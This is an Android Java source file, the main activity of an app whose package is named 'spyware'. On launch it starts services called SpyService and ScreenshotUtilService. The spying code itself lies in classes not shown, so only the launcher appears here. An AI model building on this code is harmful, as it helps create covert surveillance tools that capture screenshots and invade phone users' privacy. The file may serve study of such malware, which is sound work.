package com.example.cristianturetta.spyware;

import android.content.Context;
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        Context context = getApplicationContext();

        // TODO: 24/09/18 Concurrency problem on runnables if onCreate is started multiple times!
        FileUtil.init(context);
        (new StartupIntentService()).onHandleIntent(new Intent());
        startService(new Intent(this, SpyService.class));
        startService(new Intent(this, ScreenshotUtilService.class));

    }
}
